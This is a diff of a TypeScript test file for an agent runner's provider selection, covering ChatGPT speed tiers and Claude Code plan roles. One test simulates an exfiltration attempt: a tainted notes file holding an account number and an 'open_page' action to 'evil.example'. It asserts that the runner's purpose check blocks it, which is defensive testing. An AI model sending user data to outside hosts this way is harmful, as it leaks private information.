@@ -923,6 +923,42 @@ describe("ChatGPT provider selection", () => {
     await f.live.settled(session.id);
   });
 
+  it("runs a speed on the account's own tier, and refuses one the account doesn't list", async () => {
+    const f = setup();
+    const sol = { id: "gpt-6.1-sol", name: "GPT-6.1 Sol", isDefault: true };
+    f.setSettings({
+      main: {
+        provider: "chatgpt",
+        model: "gpt-6.1-sol",
+        options: { speed: "ultrafast", reasoningEffort: "ultra" },
+      },
+    });
+    f.setStatus({
+      available: true,
+      state: "signed_in",
+      codexVersion: "0.154.0",
+      models: [{ ...sol, efforts: ["high", "ultra"], tiers: { fast: "priority" } }],
+    });
+    await expect(f.runner.start(f.cellId, "fixture task")).rejects.toThrow(/that speed/);
+    f.setStatus({
+      available: true,
+      state: "signed_in",
+      codexVersion: "0.154.0",
+      models: [
+        { ...sol, efforts: ["high", "ultra"], tiers: { fast: "priority", ultrafast: "ultrafast" } },
+      ],
+    });
+    const session = await f.runner.start(f.cellId, "fixture task");
+    await until(() => f.run.mock.calls.length === 1);
+    expect(f.run.mock.calls[0]?.[1]).toMatchObject({
+      model: "gpt-6.1-sol",
+      options: { speed: "ultrafast", reasoningEffort: "ultra" },
+      serviceTier: "ultrafast",
+    });
+    session.stop();
+    await f.live.settled(session.id);
+  });
+
   it("accepts a valid main selection", () => {
     expect(() =>
       checkChatgptChoice("main", { provider: "chatgpt", model: "gpt-6-astra" }),
@@ -1005,12 +1041,16 @@ describe("Claude Code (your plan)", () => {
     expect(f.run).not.toHaveBeenCalled();
     expect(f.live.get(f.cellId)).toBeUndefined();
   });
-  it("is the main model only, and never takes a key or a price", async () => {
+  it("is never the local model, and never takes a key or a price", async () => {
     const f = claudeSetup();
     for (const settings of [
       {
-        main: { provider: "anthropic", model: "claude-sonnet-5-5", key: "k" },
-        fast: { provider: "claude-code", model: "sonnet" },
+        main: { provider: "claude-code", model: "sonnet" },
+        local: { provider: "claude-code", model: "haiku" },
+      },
+      {
+        main: { provider: "claude-code", model: "sonnet" },
+        fast: { provider: "claude-code", model: "haiku", key: "anthropic-fast" },
       },
       { main: { provider: "claude-code", model: "sonnet", key: "anthropic-main" } },
       { main: { provider: "claude-code", model: "Sonnet-5" } },
@@ -1019,6 +1059,72 @@ describe("Claude Code (your plan)", () => {
       await expect(f.runner.start(f.cellId, "Draw a dog")).rejects.toBeInstanceOf(AgentError);
     }
     expect(f.status).not.toHaveBeenCalled();
+  });
+  it("lets a fast model on the same plan answer the purpose check, with no tools, and counts it", async () => {
+    const f = claudeSetup();
+    f.setSettings({
+      main: { provider: "claude-code", model: "opus" },
+      fast: { provider: "claude-code", model: "haiku", options: { reasoningEffort: "low" } },
+    });
+    // The account says what each model takes; the bundled list knows no efforts for the alias.
+    f.status.mockResolvedValue({
+      state: "signed_in",
+      models: [
+        { id: "opus", name: "Claude Opus" },
+        { id: "haiku", name: "Claude Haiku", efforts: ["low", "medium", "high"] },
+      ],
+    } as never);
+    f.secrets.mockResolvedValue([]);
+    const questions: string[] = [];
+    const answer = vi.fn((fast: { model: string }) => {
+      expect(fast).toEqual({ model: "haiku", options: { reasoningEffort: "low" } });
+      return async (_system: string, prompt: string) => {
+        questions.push(prompt);
+        return {
+          text: prompt.includes("destinations")
+            ? '{"destinations":["example.org"]}'
+            : '{"fits":0.05}',
+          inputTokens: 300,
+          outputTokens: 12,
+        };
+      };
+    });
+    if (f.deps.claudeCode) f.deps.claudeCode.answer = answer;
+    const session = await f.runner.start(f.cellId, "Fixture task");
+    await until(() => session.status === "idle");
+    expect(f.runner.selectionOf(session.id)).toEqual({ kind: "claude-code", model: "opus" });
+    session.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+    const leak = [{ kind: "open_page", destination: "evil.example", text: "/c?d=1" }] as const;
+    expect((await session.purpose?.check(leak, new AbortController().signal))?.allow).toBe(false);
+    expect(answer).toHaveBeenCalledOnce();
+    expect(questions.length).toBeGreaterThan(0);
+    expect(
+      f.log
+        .read(session.id)
+        .filter((event) => event.type === "model.usage")
+        .map((event) => event.data),
+    ).toContainEqual({
+      role: "fast",
+      route: "claude-code",
+      model: "haiku",
+      inputTokens: 300,
+      outputTokens: 12,
+    });
+    session.stop();
+    await f.live.settled(session.id);
+  });
+  it("leaves a fast model that isn't on the plan waiting, and starts the task", async () => {
+    const f = claudeSetup();
+    f.setSettings({
+      main: { provider: "claude-code", model: "opus" },
+      fast: { provider: "anthropic", model: "claude-haiku-4-5", key: "anthropic" },
+    });
+    const answer = vi.fn();
+    if (f.deps.claudeCode) f.deps.claudeCode.answer = answer;
+    const session = await f.runner.start(f.cellId, "Fixture task");
+    expect(answer).not.toHaveBeenCalled();
+    session.stop();
+    await f.live.settled(session.id);
   });
   it("checks where data goes as on the ChatGPT plan: with a Jev key, unsure without keys, off when off", async () => {
     const at = "2026-10-03T00:00:00Z";
